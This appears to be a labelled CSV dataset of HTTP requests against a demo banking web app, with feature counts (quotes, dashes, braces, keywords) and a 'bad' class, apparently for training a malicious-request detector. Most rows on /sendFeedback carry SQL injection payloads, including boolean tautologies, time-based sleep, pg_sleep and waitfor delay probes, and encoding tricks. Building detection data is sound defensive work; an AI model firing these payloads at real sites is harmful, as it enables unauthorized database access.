method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',0,0,0,0,0,0,bad
GET,b'/feedback.jsp',b'',0,0,0,0,0,0,bad
GET,b'/high_yield_investments.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp',b'',0,0,0,0,0,0,bad
GET,b'/login.jsp',b'',0,0,0,0,0,0,bad
GET,b'/retirement.htm',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=fdgdnepm&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=1\'""&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=jZisTNyw&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=1%00%c0%a7%c0%a2%252527%252522&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=-1%20OR%202%2b329-329-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=-1%20OR%202%2b770-770-1=0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=%40%40S44Om&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=JyI=&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=-1'%20OR%202%2b395-395-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1""",1,0,1,0,4,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=%bf\'%bf""&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=-1'%20OR%202%2b988-988-1=0%2b0%2b0%2b1%20or%20'WxTG2AbU'='&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1""",4,0,0,0,4,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=%f0\'\'%f0""""&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1'",2,2,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=-1""%20OR%202%2b124-124-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1'",0,1,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=if(now()=sysdate()%2csleep(6)%2c0)&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,0,4,0,1,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1""",2,0,0,5,0,1,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1\'""&email_addr=sample%40email.tst&name=bvxspifs&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1'",0,2,0,5,0,1,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=%5c&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=(select(0)from(select(sleep(3)))v)/*\'%2b(select(0)from(select(sleep(3)))v)%2b\'""%2b(select(0)from(select(sleep(3)))v)%2b""*/&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1'",2,2,0,15,0,9,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1%00%c0%a7%c0%a2%252527%252522&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=1%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1""",2,0,1,0,5,2,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=%40%40yROKk&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=3eJwMr97';%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1""",3,0,1,0,5,2,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=%bf\'%bf""&email_addr=sample%40email.tst&name=bvxspifs&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=xvLeFNxW');select%20pg_sleep(9);%20--%20&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1""",1,0,1,1,3,2,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=%f0\'\'%f0""""&email_addr=sample%40email.tst&name=bvxspifs&subject=1'",2,2,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=rAtfeXUn'));select%20pg_sleep(3);%20--%20&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1""",1,0,1,1,3,2,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=1\'""&name=bvxspifs&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=ufni3a3C&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,0,0,0,0,bad
